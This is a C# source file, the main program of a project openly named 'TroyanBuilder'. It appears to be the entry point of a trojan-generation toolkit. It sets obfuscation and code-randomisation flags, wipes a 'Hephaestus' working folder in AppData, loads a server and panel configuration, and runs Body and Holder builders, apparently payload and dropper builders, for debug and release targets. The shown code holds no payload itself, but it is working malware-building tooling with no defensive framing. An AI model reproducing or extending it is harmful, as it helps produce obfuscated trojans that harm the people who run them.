using Commons;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Options;
using model;

namespace TroyanBuilder;

public class Program
{
    public static bool ObfuscateDebug = false;

    public static bool ObfuscateRelease = false;

    public static bool RandomCode = false;

    public static bool RandomDo = false;

    static void Clean()
    {
        var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Hephaestus");

        if (Directory.Exists(path))
        {
            foreach (var file in Directory.GetFiles(path)) File.Delete(file);
            foreach (var dir in Directory.GetDirectories(path)) Directory.Delete(dir, true);
            Console.WriteLine("Contents deleted.");
        }

    }

    static void Main(string[] args)
    {
        string server = args.Length > 0 ? args[0] : Dev.Mode;
        if (args.Length >= 1)
        {
            server = args[0];
        }
        string packId = "";
        if (args.Length >= 2)
        {
            packId = args[1];
        }
        Console.WriteLine("Starting Troyan Builder: server:" + server + " packId:" + packId);

        Clean();
        var config = new ConfigurationBuilder()
            .SetBasePath(AppContext.BaseDirectory)
            .AddJsonFile("appsettings.json", optional: false)
            .Build();

        var services = new ServiceCollection();
        services.AddSingleton<IValidateOptions<DomainHostOptions>, DomainHostOptionsValidator>();
        services.AddOptions<DomainHostOptions>()
            .Bind(config.GetRequiredSection(DomainHostOptions.SectionName))
            .ValidateOnStart();
        services.AddSingleton<IHephaestusPathResolver, HephaestusPathResolver>();
        services.AddPanelServerStack();

        using var provider = services.BuildServiceProvider();
        var loader = provider.GetRequiredService<ServerModelLoader>();

        var arr = new CustomBuilder[]{new BodyBuilderDebug(), new BodyBuilderRelease(), new HolderBuilderDebug(), new HolderBuilderRelease()};
        foreach (var cb in arr)
        {
            Console.WriteLine(cb);
            var result = cb.Build(server, packId, loader);
            foreach (var line in result)
            {
                Console.WriteLine(line);
            }
        }
    }
}
